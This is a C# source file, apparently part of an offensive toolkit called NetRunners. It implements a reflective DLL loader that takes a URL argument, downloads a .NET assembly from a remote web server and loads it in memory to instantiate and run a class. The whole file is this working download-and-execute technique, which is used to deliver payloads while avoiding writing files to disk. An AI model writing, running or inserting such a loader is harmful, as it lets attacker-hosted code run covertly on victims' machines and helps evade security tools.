using System;
using System.Net;
using System.Reflection;
using NetRunners.Interfaces;
using static NetRunners.Helpers.Helper;

namespace NetRunners.Runners
{
    /// <summary>
    /// Reflective DLL Loading Technique. 
    /// Loads and executes a Dll hosted in your webserver.
    /// Currently configured to work with NR.dll by instantiating TestClass().
    /// </summary>
    class ReflectiveDllLoad : IRunner
    {
        public void Run(string[] args)
        {
            try
            {
                string className = "TestClass";
                string assemblyUrl = args[1];
                string methodName = "TestClass()";

                // print technique name and target process (if applicable)
                string techniqueName = "Reflective Dll Load";
                PrintTechniqueInfo(techniqueName);
                Console.WriteLine($"[+] DLL URL                     :  {assemblyUrl}");
                Console.WriteLine($"[+] ClassName                   :  {className}()");
                Console.WriteLine($"[+] MethodName                  :  {className}()");

                // download and load assembly
                WebClient webClient = new WebClient();
                byte[] assemblyBytes = webClient.DownloadData(assemblyUrl);

                Assembly assembly = Assembly.Load(assemblyBytes);
                Console.WriteLine("[+] Dll Downloaded and Loaded");

                // Create an instance of the class and execute
                object instance = assembly.CreateInstance(className);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred: {e.Message}");
            }
        }
    }
}
